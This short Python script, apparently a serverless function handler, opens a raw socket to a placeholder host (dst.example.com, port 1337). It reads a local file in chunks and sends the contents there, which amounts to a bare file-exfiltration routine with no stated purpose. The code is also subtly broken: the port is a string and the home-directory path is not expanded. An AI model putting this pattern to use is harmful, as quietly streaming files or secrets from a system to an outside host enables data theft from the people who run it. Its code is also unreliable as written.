import socket, sys

DSTHOST="dst.example.com"
DSTPORT="1337"

FILE="~/file.txt"

def lambda_handler(event, context):
    s = socket.socket()
    s.connect((DSTHOST,DSTPORT))
    f = open (FILE, "rb")
    l = f.read(1024)
    
    while (l):
        s.send(l)
        l = f.read(1024)
    s.close()
